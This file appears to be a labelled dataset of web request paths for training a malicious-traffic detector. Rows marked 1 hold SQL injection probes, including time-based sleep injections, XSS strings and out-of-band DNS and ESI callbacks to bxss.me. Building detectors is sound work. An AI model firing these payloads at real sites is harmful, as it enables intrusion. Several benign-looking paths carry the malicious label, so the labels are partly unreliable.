request	label
/***/0/01/47/40/1474000_754735.jpg	0
"/***/getdetail?data={""news_id"":""1264315"",""diversion_id"":"""",""sign"":""""}"	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrteki/oytw3rep4w0mido1mc=&openid=ovl7jjto8ralltbu8zqyd38pechw&outer_str=42980&activate_ticket=fdzv9emqaffrnr3xboqhbyd3f21g8teh2jwjbwmar7noo8dbj5 fzedtzplsmcardqc7in/s/mcolc3wz9ny8rlwpafdunkgh gwiiwuwfs=	0
/*******/qiye/b-e1506631.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u591a\u591a\u7ecf\u9500\u90e8	0
/****/zdlygk/ncwywfgz/if(now()=sysdate(),sleep(12),0)/yzq/xmb_gzdxb.htm	1
/***/0/01/38/04/1380467_603805.jpg	0
/***/003/004/388/00300438896_d731a324.jpg	0
/***/0/00/74/17/741735_259107.jpg	1
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zfzbjbsc/	0
/****/web/search?channelid=234439&orderby=relevance&perpage=24') and 5314=3656 and ('1'='1&searchword=1	1
/zwxx_11337/****/202111/t20211110_3121981.html	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(978)"">?_=1630311679312"	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5f20\u56fd\u971e\u670d\u88c5\u5e97	0
/****/xef_35359/yw_1295/202102/t20210208_2596059.html	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u97e6\u5dde\u9547\u559c\u6765\u987a\u79cd\u690d\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/wp-admin/admin-post.php?page=fancybox-for-wordpress	1
/***/0/01/39/56/1395694_812167.jpg	0
/zwxx_11337/****/202008/t20200804_2178833.html	0
"/****/category/silujiaoyu?*/-->'""""></iframe></script></style></title></textarea><script >alert(75996)</script>=1"	1
"/***/main/admin/course_category.php?action=add&category=""""/><script>confirm(777)</script>"	1
/****/xef_35359/yw_1295/202101/t20210120_2574695.html	0
/****************/images/crm/default/img_wallet_banenr_bg.png	0
/****/zcwjk' and 2*3*8=6*8 and 'vchk'='vchk/gcjsbz_sjbz/1.htm	1
"/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/******/bzxajgc/szss/plx.htm"	1
/******/download/downfile.jsp?classid=0&filename=5b3c34d3371f43c19b0a669176cfe2ad.doc' and 9123=9123 and 'kxyi'='kxyi	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u6e05\u6885\u8c03\u6599\u5e97	0
/**********/system/2017/10/18/012442898.shtml?url_type=39&object_type=webpage&pos=1	1
/****/gccb/txgc/	0
/***/blockdata/getsearchinfo.do?&title=\u6842\u6797\u4e1c\u660c	0
/zwxx_11337/****/202111/t20211119_3138879_zzb.html	0
"/*****/mydevice/index.jsp?locale=""""><script>alert(777)</script>"	1
/****/zgsdt/2021_qydt/202111/t20211117_320801.html	0
/**********/system/2021/04/02/013361407.shtml	0
/****/zzxxgk/nyncj/xxgkml/jytabl/zxtajg/202111/t20211110_196361_wap.html	0
/******/system/2020/04/05/013132135.shtml	0
"/****/bysrd/201611/t20161129_78963.html?leader=温旭东'""""()&%<acx><script >room(9327)</script>"	1
/**************/newscenter/system/2021/12/19/013496753.shtml	0
/**********/system/more/201000000000000/0012/201000000000000_00001220.shtml	0
"/***/getdetail?data={""news_id"":""1263776"",""diversion_id"":"""",""sign"":""""}"	0
/zwxx_11337/*******/202109/t20210906_3005403.html	0
/******/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/js/base64.js	1
/***/interface/daily_clickcount.json.jsp?callback=jquery17107899375232062629_1639980607960	0
"/****/admin/edit.php?menu="""">pt>alert(777); script>pt>"	1
/***/003/004/509/00300450930_9e2e8dc0.png	0
/******/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/lmy.css	1
/**/ourbusiness/rdandmanufacture/201412/t20141210_22173.html' and 'x'='x	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u4f55\u7434\u9910\u5385	0
/****/system/2021/12/13/javascript:dozoom(12)	1
"/******/system/2021/06/09/013399706'""""/><img src=x onerror=alert(2324)>.shtml"	1
/**********/system/2020/06/06/013179313.shtml	0
/****/category/yidaiyiluwenda?page=1 and 2158=2158--	1
"/"""" """"a"""".concat(70-3).concat(22*4).concat(108).concat(82).concat(103).concat(67) (require""""socket""""
socket.gethostbyname(""""hitle"""" """"kcqepxlh7dfb3.bxss.me."""")[3].to_s) """"/****/7/12/art_35_234319.html"	1
/*************/ztsj/zt/2017jgnb/sjzf/201802/p020180208451188551454.pdf	0
"/****/bmkx/snmj/202011/"""	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u94f6\u6865\u98df\u5e9c\u9910\u5385	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u8d62\u548c\u70df\u9152\u5546\u884c	0
"/cgi-bin/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="""">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search"	1
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(1027)"">?_=1630311706240"	1
/****/xh/hd/202003/t20200327_2003535.html	0
/***/003/004/326/00300432621_9fdfd7f7.jpg	0
/******/system/2016/09/28/012145987.shtml	0
/**/bxss.me.do	1
/*****/system/2021/11/12/javascript:void();	1
/*********/plus/mytag_j.php?aid=6022	1
/***/0/02/02/90/2029073_999908.jpg	0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u5b97\u5c71\u7269\u8d44\u7ecf\u9500\u90e8	0
/******/system/2017/05/11/012308151.shtml	0
"/****/""""><script>alert(71)</script>"	1
/*****/system/2014/12/23/011591237.shtml	0
"/******/resource/storage/localupload.jsp?doaction=save and if(now()=sysdate(),sleep(6),0)/*'xor(if(now()=sysdate(),sleep(6),0))or'""""xor(if(now()=sysdate(),sleep(6),0))or""""*/&rid=1rnott09fg&uptoken=1ff87566684b40c688f756b86e2c3798"	1
"/*******/main/admin/course_category.php?action=add&category=""""/><script>confirm(777)</script>"	1
//***********/ui/lib/jquery/jquery.min.js	1
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u78b3\u6392\u653e	0
/***/003/004/476/00300447659_78474eeb.png	0
"/**/openemr/?site="""">alert(777);"	1
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqshzyxy/index_1.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5927\u6218\u573a\u871c\u96ea\u51b0\u57ce\u5976\u8336\u5e97	0
/***/col209/http://bxss.me/t/fit.txt.html	1
/****/zgsdt/2021_qydt/202111/t20211126_322370.html	0
/****/zxxx/content.html?metadataid=10062447	0
/****/xqdt/hnx/202103/local	0
/**********/system/2021/08/06/013431447.shtml	0
/******/usercenter/index?qrcode=42887&code=071aafll2p4jk84bcool2vusxy1aafld	0
/*****/system/2021/12/16/javascript:void(0);	1
"/****/server/news/show/title/""><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c"	1
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u90dd\u5bb6\u6865\u957f\u57ce\u52a0\u6cb9\u7ad9	0
/**/ui/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/security/crypto-js.js	1
/****/http://bxss.me/t/fit.txt?.jpg/demo11.html	1
/****/system/2021/12/19/javascript:window.close();	1
"/vc"""" and 2*3*8=6*8 and """"837p""""=""""837p/**/lib/easyui/themes/bootstrap/window.css"	1
/******/system/2020/05/18/013164037.shtml	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u4f0a\u6e05\u62c9\u9762\u9986	0
/****/dxg1hc-hynews-e106500997.html	0
/****/system/count/0036056/008000000000/count_page_list_0036056008000000000.js	0
/****/b-e829561.html	0
/****/system/2009/06/04/002750677.shtml	0
/'.gethostbyname(lc('hitum'.'nsbkdczq3dd58.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(117).chr(79).chr(111).chr(90).'/****/202103/t20210303_2614145.html	1
/****/web/search?searchword=1&channelid=287219&perpage=24&templet=1' or 7583=4017	1
/**/mswpmm/common/newaccount.aspx?ddlculture=alert(777)	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5360\u5174\u67b8\u675e\u8d2d\u9500\u7ecf\u7eaa\u4eba	0
/****/zzxxgk/bmfgj/fgfzgg/fggzdt/201909/t20190905_141879.html	0
/*/http://bxss.me/t/xss.html?	1
/****/system/2021/11/13/javascript:window.print()	1
"/' 'a'.concat(70-3).concat(22*4).concat(114).concat(83).concat(103).concat(80) (require'socket'
socket.gethostbyname('hitev' 'ybtblhdkd8b81.bxss.me.')[3].to_s) '/**/widgets/scrollup/js/jquery.scrollup.min.js"	1
/****/ztly/xxdj/201911/t20191122_1859284.html	0
/****/czgk/bmjs/zzqfyxt/plxrmfy/201805/t20180524_765873.html	0
/****/system/2017/03/21/javascript:window.close();	1
/*******/wfp.php	1
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u5f00\u53d1\u533a\u5149\u624d\u5c0f\u5356\u90e8	0
/**********/system/2020/04/05/013132316.shtml	0
/******/system/2019/07/08/012923361.shtml	0
/******/2018index/	1
/****/bmkx/snmj/index_2.html	0
/**********/system/2020/03/26/013125828.shtml	0
"/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqbbqzjggw_1815/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a>"	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u5403\u5728\u70e4\u5427	0
/****/zdlygk/ncwywfgz/szss/plq/xmb_gzdxb' and 2*3*8=6*8 and 'kghj'='kghj.htm	1
/***/wp-admin/admin-post.php?page=fancybox-for-wordpress	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u8521\u90a6\u852c\u83dc\u7ecf\u9500\u90e8	0
/****/	1
/************//xfs.bxss.me/jcse/110105008056111/16/images/style.css	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6167\u7fce\u5546\u8d38\u6709\u9650\u516c\u53f8	0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448') or 1050=2295	1
/****/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/zwxx_11337/****/ytdd/	0
/****/zdlygk/ncwywfgz/zws%' and 2*3*8=6*8 and 'ikkt'!='ikkt%/yzq/xmb_gzdxb.htm	1
/****/20210806/javascript:void(0);	1
"/********/files.php?folder="""">alert(777)"	1
/****/rsgzxx/rsrm' and 2*3*8=6*8 and 'je60'='je60/1.htm	1
/**********/system/2021/12/16/013495204.shtml	0
/****/zzxxgk/bmsthjj/xxgkml/ybjhygq/201909/t20190912_142148.html	0
/***/mobile_h5/waparticledetail.do?article_id=201906161056121014&contenttype=article	0
/****/byyw/202007/t20200720_169478.html	0
/****/admin/index.php?step=admin_member_display&search_field=all&keyword=<script>alert(777)</script>&cmd_button=search user	1
/system%' and 2*3*8=6*8 and 'egwj'!='egwj%/********/js/newcalendar/config.js	1
/******/jz-icon4_xmt.png	0
"/***/getsubject?data={""subject_id"":292,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":4324,""sign"":""""}"	0
//***********/wdsjs/hfswsj/	1
/****/category/guojialingdaoren?page=1</script><script>l452(9168)</script>	1
/****/zzxxgk/tjj/zfxxgkml_/xfs.bxss.me/xwfbh_2065/list.html	1
/****/czgk/http://bxss.me/t/fit.txt/gdyx/	1
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202112/w020211220625775392452.jpg	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u6c38\u742a\u7406\u53d1\u5e97	0
/**********/system/2020/03/14/013113967.shtml	0
/***/0/02/10/17/2101754_971239.jpg	0
"/***/getsubject?data={""subject_id"":549,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":378258,""sign"":""""}"	0
"/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqwsjkwyh/zzqwsjsw/\""javascript:void(0)\"""	1
"/*****/gw_admin.php?a="""">alert(777);&t=settings"	1
"/******/index.php?do=search&search=""><body onload=eval(alert(777)) ><!--"	1
/*******/taglib/channel/dage.php	1
/****/czgk/bmyjs/zzqjcyxt/wzsjcy/201712/t20171212_633972.html	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u5fc3\u5fc3\u76f8\u5370\u7cbe\u54c1\u5e97	0
/*****/20210621/10024.html	0
/**********/system/2021/08/23/013438601.shtml	0
/**/mavideo/gvideos.php?gid=1 and 1=1	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u9e3f\u51cc\u9910\u5385	0
"/**/ui/lib/easyui"""" and 2*3*8=6*8 and """"ytlf""""=""""ytlf/plugins/jquery.panel.js"	1
/*******/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u4e01\u8bb0\u7a46\u65af\u6797\u9910\u5385	0
/***/0/11/04/19/11041901_705855.jpg	1
/****/zgsdt/2014zgsdt/201502/t20150206_53650.html	0
/**********/system/2012/12/07/010972251.shtml	1
/**/system/2021/04/25/javascript:void(0);	1
/******/if(now()=sysdate(),sleep(15),0)/jpage/theme/default/css/jpage.css	1
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(436)</script>?_=1630311406219"	1
/****/index.php?ac=search&at=taglist&tagkey=anony',tags) or did>1 and 101=ascii((seselectlect mid(table_name,1,1) frfromom information_schema.tables whwhereere table_schema =database() limit 1,1)) limit 1-- t t	1
/****/bxss.me/201610/t20161016_531.html	1
/******/resource/swf/flowplayer.commercial.swf	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6d77\u98df\u5c1a\u9910\u996e\u6709\u9650\u516c\u53f8	0
/*****/gy48/cpgyss.asp?key=\u73bb\u7483\u94a2\u4f9b\u6392\u6c34\u7ba1\u9053&l=\ufffd\ufffd\ufffd\u0279\ufffd	0
/******/system/2019/06/21/012909163.shtml	0
/****/zzxxgk/tjj/zfxxgkml_http://bxss.me/t/xss.html?	1
"/****/wlzj/' 'a'.concat(70-3).concat(22*4).concat(112).concat(71).concat(97).concat(72) (require'socket'
socket.gethostbyname('hitrh' 'iisilxywe0efe.bxss.me.')[3].to_s) '/t20210303_2614145.html"	1
/******/system/javascript:alert(2698)/013399706.shtml	1
/****/xqldly/hfhnsj/202108/t20210805_185354.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5b66\u53cb\u6253\u5370\u90e8	0
/***/col106/index.html?uid=20109&pagenum=1	0
/****/js/chunk-089bd287.f928320f.js	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u6d12\u5bb6\u719f\u98df\u5e97	0
/******/rss/rssfeed.jsp?colid=34') and 5048=1574 and ('xrko'='xrko	1
/**/system/2021/07/20/012181639.shtml	0
/****/20210824/javascript:void(0);	1
/****/bmkx/sgaj/201807/w020180730652479835488.jpg	0
/****/20201006/e107954663.html	0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u9e4f\u7a0b\u526f\u98df\u7ecf\u9500\u90e8	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u9017\u53f7\u9020\u578b\u5ba4	0
/****/zfxxgk1/zfxxgkzd/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm	1
/***/mobile_h5/waparticledetail.do?article_id=202006121540031139&contenttype=article	1
/***/blockdata/getsearchinfo.do?&title=\u585e	0
/**********/system/more/2170000/0001/2170000_00000156.shtml	0
"/**/main/admin/course_category.php?action=add&category=""""/><script>confirm(777)</script>"	1
/****/bmkx/sgaj/202112/t20211220_197940.html	0
/**********/system/2021/12/16/javascript:void();	1
/******/download/downfile.jsp?classid=0&filename=72a64bf486d74bca8643c56c4ce11e27.doc%' and 2*3*8=6*8 and 'qab7'!='qab7%	1
/****/jjlzsdsscddh/xyddhlzzwn/javascript:void(0);	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u56de\u4e61\u714e\u997c\u5e97	0
/****/web/search?page=224&channelid=222832&searchword=\u54b8\u8f89&keyword=\u54b8\u8f89&perpage=20&outlinepage=10	0
/************/interfaces/autocomplete.do?begin=1&end=1&eq=1&oq=1&p=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&pg=1&pos=1&pq=1&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111	1
/*******/iz0aoo0.php	1
/****/20200906/e106284998.html	0
/**/system/2021/12/08/012228234.shtml	0
/****/index_3.html	0
/************/interfaces/dimension.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&pos=filenumber&pq=&q=请输入关键词&searchid=44&tpl=16&websiteid=110105008056111	1
/**********/system/2021/04/04/javascript:window.print()	1
"/************/template/jcse/110105008056111/16/images/jquery.autocomplete.js/""><script>alert(2149)</script>"	1
"/**/ui/lib"""" and 2*3*8=6*8 and """"yq4z""""=""""yq4z/security/sm2_util.js"	1
/************/template/jcse/110105008056111/16/images/plugin/waterpull/bxss.me.js	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u610f\u5c14\u5eb7\u4e13\u5356\u5e97\u77f3\u5634\u5c71\u4e07\u8fbe\u5e97	0
/**********/system/2011/12/10/javascript:window.close()	1
/*******/4og.php	1
"/****/index.php?do=search&search=""><body onload=eval(alert(777)) ><!--"	1
/*******/qiye/b-e1814314.html	0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/zjdt/gzdt/144.htm	1
/****/dqgz/201808/w020180817406660053378.jpg	0
"/images"""" and 2*3*8=6*8 and """"td8g""""=""""td8g/*/hanweb.min.css"	1
/**********/system/2021/08/27/013440714.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u6c47\u5c1a\u7f8e\u53d1\u5e97	0
/****/zxxx/content.html?metadataid=10062883	0
/zwxx_11337/****/201809/t20180920_1069384.html	0
"/**/ui/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/easyui/plugins/jquery.draggable.js"	1
/****/system/2017/04/18/javascript:dozoom(14)	1
/****/qzfwj/201903/t20190321_1324496.html/index_1.html	0
/zwxx_11337/****/zcjd/index.json	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5170\u5c0f\u519b\u9ec4\u91d1\u9999\u7116\u997c	0
/***/app/worktable/oaurl.z?userno=51216&moduleid=1487877924	1
/******/index.cfm?fuseaction=clogin.main&returnurl=&status=sendlogin&email=alert(777)	1
/****/20210120/e114825308.html	0
/****/bmkx/sfgw/201610/t20161025_14171.html	0
"/****/石家庄?page=1'""""()&%<acx><script >wkxa(9604)</script>"	1
/**************/article/201911/201911291441281142.html	0
/*****/system/2021/11/03/javascript:window.print()	1
/******/window.location,	1
/**********/system/2021/10/23/013468891.shtml	0
/zwxx_11337/****/201905/t20190509_1471138.html	0
/*****/cgi-bin/ipinfo.cgi?alert(777)	1
/******/system/2020/11/23/javascript:window.close();	1
/******/card/ajax/schoollist.ashx?areaid=635150995745815024	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u8001\u8857\u8863\u820d\u670d\u88c5\u5e97	0
/****/b-e1095188.html	0
/***/0/01/85/02/1850220_542138.jpg	0
/****/consultdetails/geogia	1
/****/wdszs/hfsz/202101/t20210111_176049.html	0
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u5efa\u52cb\u5546\u5e97	0
/*****/20211110/10717.html	0
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/zytxj	0
/*******/34qv.php	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtp8qk9u2dgw idmrztkpfd8=&openid=ovl7jjscvlq0temtxn073mr_n7tq&outer_str=17460&activate_ticket=fdzv9emqaffrnr3xboqhbwh 45bmhkuye6u0nsnvcwnoo8dbj5 fzedtzplsmcarob7c/bvlxukq55/htbnt/z plrb36psjuxpibleyra8=	0
/****/qzfwj/201801/t20180115_669464.html/index_1.html	0
/***********/jinrongqihuo/guzhiqihuo/2021-01-22/1713.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u7ecf\u6d4e\u5f00\u53d1\u533a\u5b8f\u9676\u74f7\u7816\u7ecf\u9500\u90e8	0
/****/bmkx/ygjt/index_wap.html	0
/**********/system/2021/12/16/013495446.shtml	0
"/**/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="""">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search"	1
/****/201909/t20190926_1756994.html	0
/zwxx_11337/****/201812/t20181218_1215661.html	0
/****/if(now()=sysdate(),sleep(15),0)/2021_mtgz/202105/t20210505_273338.html	1
/****/0208/322090.shtml	0
/0'xor(if(now()=sysdate(),sleep(18),0))xor'z/**************/2017-02-16/221.html	1
/**/ui/css'||'/global.css	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u805a\u5408\u4fe1\u606f\u6280\u672f\u6709\u9650\u516c\u53f8	0
/**/resetpwd%' and 2*3*8=6*8 and '3hfq'!='3hfq%/show.do	1
/****/zzxxgk/jjhzj/gyjzq/pcq_3664/	0
/*****/gy48/ljcpgyview.asp?id=40841120&l2=\ufffd\ufffd\u0328&l=\u027d\ufffd\ufffd	0
/*******/201905/201905101701241125.html	0
"/************/search.do?begin=1&end=1&eq=1&oq=1&p=1&pg=1&pos=1&pq=1&q=请输入关键词&searchid=1&tpl=16<esi:include src=""""http://bxss.me/rpb.png""""/>&websiteid=110105008056111"	1
/***/003/001/149/00300114901_9e08ea78.jpg	0
"/************/template/jcse/110105008056111/16/images/mypagination/jquery.mypagination6.0.js/<img src=""javascript:alert(2165)"">"	1
/*****/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/****/sj1/jjzs/202012/t20201224_2538400.html	0
/****/index_4.html	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u98ce\u60c5\u5c0f\u9547\u51c9\u76ae\u5e97	0
/****/kjzl/ and 1=1	1
/**********/system/2020/08/10/013223116.shtml	0
/****/qzfwj/201801/t20180115_669597.html	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u76d0\u4e30\u4e8c\u624b\u8f66\u4fe1\u606f\u670d\u52a1\u90e8	0
/****/zxxx/content.html?metadataid=10062595	0
/***/interface/daily_clickcount.json.jsp?callback=jquery17108632315764994793_1639991175360	0
/****/xydt/2021_xsrw/	0
/**/system/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
"/****/category/silutouzi?page='""""()&%<acx><script >z9xk(9907)</script>"	1
/****/bmkx/sfgw/202101/w020210127551019823052.png	0
/******/resource%' and 2*3*8=6*8 and '2ajq'!='2ajq%/js/jquery/jquery-latest.min.js	1
/*********/treasury/index.aspx?nodeid=394 and 4736=4736	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u745e\u5b8f\u4fe1\u7535\u5b50\u4ea7\u54c1\u7ecf\u9500\u90e8	0
